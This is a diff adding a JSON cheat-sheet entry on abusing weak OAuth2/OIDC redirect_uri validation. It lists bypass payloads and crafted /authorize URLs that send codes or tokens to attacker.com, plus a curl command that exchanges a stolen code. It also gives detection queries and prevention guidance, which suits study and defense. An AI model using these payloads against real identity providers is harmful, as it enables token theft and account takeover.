@@ -1,0 +1,108 @@
+{
+  "id": "web-oauth-redirect-uri-abuse",
+  "name": "OAuth2/OIDC redirect_uri Validation Abuse",
+  "command": "GET /authorize?client_id=<client_id>&redirect_uri=<url>&response_type=code&scope=openid&state=<state>",
+  "description": "Abuses weak redirect_uri validation at an OAuth2/OIDC authorization endpoint to redirect the authorization code or token to an attacker-controlled destination. Covers prefix/substring/host-only matching, appended path or query tricks, open-redirect chaining on an allow-listed domain, path traversal, and parameter pollution that leaks the code to a server you control, leading to account takeover.",
+  "platform": "multi",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Web",
+  "subcategory": "Authentication",
+  "certifications": [
+    "CWES"
+  ],
+  "primary_cert": "CWES",
+  "source": "PortSwigger Web Security Academy - OAuth",
+  "tags": [
+    "oauth",
+    "oidc",
+    "redirect-uri",
+    "account-takeover",
+    "open-redirect",
+    "sso"
+  ],
+  "mitre": [
+    "T1190",
+    "T1528",
+    "T1539"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== WHY IT WORKS ===\n  The authorization server is supposed to match redirect_uri against the client's pre-registered value EXACTLY. When it instead does prefix, substring, or host-only matching (or allows an open redirect on the trusted host), the code/token is delivered to an attacker endpoint.\n\n=== VALIDATION GAPS TO TEST ===\n  - Exact-match bypass by appended path:   redirect_uri=https://app.example.com.attacker.com\n  - Prefix match:                          redirect_uri=https://app.example.com@attacker.com\n  - Host-only match + path traversal:      redirect_uri=https://app.example.com/callback/../../attacker\n  - Appended params / HPP:                 redirect_uri=https://app.example.com/cb&redirect_uri=https://attacker.com\n  - Localhost / loopback allowance:        redirect_uri=http://localhost.attacker.com\n  - Open redirect on trusted host:         redirect_uri=https://app.example.com/redirect?to=https://attacker.com\n  - Weak scheme:                           redirect_uri=javascript://... or data://...\n\n=== STEAL THE CODE (code flow) ===\n  1. Craft an /authorize URL with your redirect_uri and send it to a logged-in victim.\n  2. Victim's browser is redirected with ?code=... to your endpoint.\n  3. Exchange the code at /token using the (often public) client_id + PKCE verifier if required.\n\n=== IMPLICIT FLOW (token in fragment) ===\n  response_type=token delivers the access token in the URL fragment; an open redirect or a page that leaks document.location / Referer exposes it.\n\n=== TOOLING ===\n  - Burp Suite: capture the /authorize request in Repeater, mutate redirect_uri.\n  - Burp extension 'OAuth2 / OIDC' or hackvertor for encoding.\n  - Note the client_id, scopes, response_type, and whether PKCE (code_challenge) is enforced.\n\n=== RELATED ===\n  - Combine with a missing/unvalidated state (see web-oauth-state-pkce) for login CSRF.\n  - Open-redirect primitive overlaps with CRLF / header-based redirects.",
+  "examples": [
+    {
+      "label": "Subdomain-suffix bypass stealing the code",
+      "command": "https://sso.example.com/authorize?client_id=webapp&response_type=code&scope=openid&redirect_uri=https://app.example.com.attacker.com/cb&state=xyz"
+    },
+    {
+      "label": "Open redirect on trusted host to exfil the token",
+      "command": "https://sso.example.com/authorize?client_id=webapp&response_type=token&redirect_uri=https://app.example.com/out?url=https://attacker.com&state=xyz"
+    },
+    {
+      "label": "Exchange a stolen code at the token endpoint",
+      "command": "curl -s https://sso.example.com/token -d grant_type=authorization_code -d code=<token> -d client_id=webapp -d redirect_uri=https://app.example.com.attacker.com/cb"
+    }
+  ],
+  "references": [
+    {
+      "title": "PortSwigger - OAuth 2.0 authentication vulnerabilities",
+      "url": "https://portswigger.net/web-security/oauth"
+    },
+    {
+      "title": "RFC 6749 - OAuth 2.0 (redirect_uri)",
+      "url": "https://datatracker.ietf.org/doc/html/rfc6749#section-3.1.2"
+    },
+    {
+      "title": "OAuth 2.0 Security Best Current Practice (RFC 9700)",
+      "url": "https://datatracker.ietf.org/doc/html/rfc9700"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "web-oauth-state-pkce",
+      "note": "Pair with missing state / PKCE downgrade for login CSRF and token leaks.",
+      "rel": "next"
+    },
+    {
+      "id": "web-jwt-attacks",
+      "note": "OIDC id_tokens are JWTs - attack the token after acquisition.",
+      "rel": "next"
+    },
+    {
+      "id": "ssrf-identify",
+      "note": "Open-redirect primitives on trusted hosts also feed SSRF chains.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Authorization servers that match redirect_uri loosely (prefix, substring, host-only, or honoring an open redirect on the registered host) deliver the authorization code or token to an attacker endpoint. Public clients with no client secret make exchanging a stolen code trivial.",
+    "prerequisites": "A valid client_id and a known authorization endpoint. The victim must be authenticated to the IdP and must open the crafted /authorize link (or it must auto-approve).",
+    "impact": "Theft of the authorization code or access/ID token leading to full account takeover of the victim's account on the relying party, and access to any API scopes granted to the client.",
+    "detection": "[MITRE T1190] Web/proxy logs showing /authorize requests whose redirect_uri does not exactly equal a registered value - unexpected hosts, userinfo (@), appended paths, or doubled redirect_uri parameters. Spikes of code grants redirected off-domain.",
+    "artifacts": "Reverse-proxy and IdP access logs for the /authorize and /token endpoints (redirect_uri parameter, client_id, response_type), referrer headers leaking fragments, and authorization-code exchanges from unexpected source IPs.",
+    "splunk_spl": "index=web uri_path=\"/authorize\" \n| rex field=uri_query \"redirect_uri=(?<redir>[^&]+)\" \n| eval redir=urldecode(redir) \n| search NOT redir IN (\"https://app.example.com/cb\") \n| stats count by clientip, redir, client_id",
+    "elastic_kql": "url.path:\"/authorize\" and url.query:*redirect_uri* and not url.query:\"redirect_uri=https%3A%2F%2Fapp.example.com%2Fcb\"",
+    "sentinel_kql": "W3CIISLog\n| where csUriStem == \"/authorize\"\n| extend redir = extract(@\"redirect_uri=([^&]+)\", 1, csUriQuery)\n| where isnotempty(redir) and redir !startswith \"https%3A%2F%2Fapp.example.com\"\n| summarize count() by cIP, redir",
+    "sigma_rules": "web_oauth_redirect_uri_mismatch",
+    "prevention": "Require exact string match of redirect_uri against the pre-registered value (no prefix/substring/wildcard). Register full URIs including path. Mandate PKCE for all clients and bind the code to the verifier. Never host open redirects on the IdP or RP domains. Use response_type=code (not token) and short-lived single-use codes.",
+    "sources": [
+      "https://portswigger.net/web-security/oauth",
+      "https://datatracker.ietf.org/doc/html/rfc9700"
+    ],
+    "detections": [
+      {
+        "platform": "splunk",
+        "name": "OAuth /authorize with non-registered redirect_uri",
+        "logic": "index=web uri_path=\"/authorize\"\n| rex field=uri_query \"redirect_uri=(?<redir>[^&]+)\"\n| eval redir=urldecode(redir)\n| regex redir!=\"^https://app\\.example\\.com/\"\n| stats count values(redir) as redirs by clientip, client_id",
+        "data_source": "iis",
+        "attack": [
+          "T1190",
+          "T1528"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Newly onboarded clients with additional registered callback URLs; staging redirect hosts.",
+        "tuning": "Maintain an allow-list of registered redirect_uri values per client_id and alert only on deviations."
+      }
+    ]
+  }
+}
